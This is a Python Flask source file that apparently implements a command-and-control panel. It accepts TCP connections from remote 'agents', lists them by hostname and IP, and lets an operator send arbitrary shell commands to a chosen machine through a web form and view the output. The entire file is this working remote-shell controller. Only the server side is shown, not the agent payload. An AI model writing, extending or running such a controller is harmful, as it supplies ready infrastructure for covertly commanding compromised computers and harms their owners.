from audioop import add
import socket
import threading
import time
from flask import *

ip_address ='127.0.0.1'
port_number = 5555
COMPUTERS=[]
CONNECTIONS=[]
IPS = []
CMD_INPUT = []
CMD_OUTPUT = []


app = Flask(__name__)

@app.before_first_request
def init_server():
    srv = threading.Thread(target=server)
    srv.start()

def server():
    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((ip_address,port_number))
    print("Starting Server....")
    server_socket.listen(5)
    x=0
    while(True):
        connection,address = server_socket.accept()
        print(connection)
        if connection not in CONNECTIONS:
            CONNECTIONS.append(connection)
            IPS.append(address)
            CMD_INPUT.append(f"")
            CMD_OUTPUT.append("")
            hostname = connection.recv(1024).decode()
            COMPUTERS.append(hostname)
        thread_index= find_connection(connection)
        t=threading.Thread(target=handle_connection,args=(connection,thread_index))
        t.start()
        print('thread Started')
        


def handle_connection(connection,thread_index):
    
    print(COMPUTERS)
    print("out of while")
    while CMD_INPUT[thread_index] != 'bye':
        while CMD_INPUT[thread_index]!='':
            print('inside of while')    
            usr_msg = CMD_INPUT[thread_index]
            print(f'about to send {usr_msg}')
            connection.send(usr_msg.encode())
            if CMD_INPUT[thread_index] !='bye':
                CMD_INPUT[thread_index]=''
                usr_msg=connection.recv(1024).decode()
                CMD_OUTPUT[thread_index]=usr_msg
                print("Leaving second while!!!!")
            break
    app.logger.info(f'disconnecting {COMPUTERS[thread_index]}!!!!!!!!!!!!!!!!!!')
    disconnect(connection,thread_index)

def disconnect(connection,thread_index):
    connection.close()
    CMD_INPUT.pop(thread_index)
    CONNECTIONS.pop(thread_index)
    IPS.pop(thread_index)
    CMD_OUTPUT.pop(thread_index)
    COMPUTERS.pop(thread_index)


def find_connection(connection):
    for i,conn in enumerate(CONNECTIONS):
        if conn == connection:
            return i


@app.route("/home")
def index():
    return render_template("index.html")

@app.route("/agents")
def agents():
    return render_template('agents.html',computers=COMPUTERS,ips=IPS)


@app.route("/<agentname>/executecmd")
def executecmd(agentname):
    return render_template("executecmd.html",name=agentname)

@app.route("/<agentname>/executecmd",methods=['GET','POST'])
def execute(agentname):
    if request.method == 'POST':
        cmd = request.form['command']
        for i in COMPUTERS:
            if agentname == i:
                req_index = COMPUTERS.index(i)
                print(req_index)
                break
        CMD_INPUT[req_index] = cmd
        time.sleep(2)
        if cmd == 'bye':
            return redirect("/agents")
        else:
            cmdoutput = CMD_OUTPUT[req_index]
            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=COMPUTERS[req_index])


if __name__=='__main__':
    app.run(debug=True,threaded=True)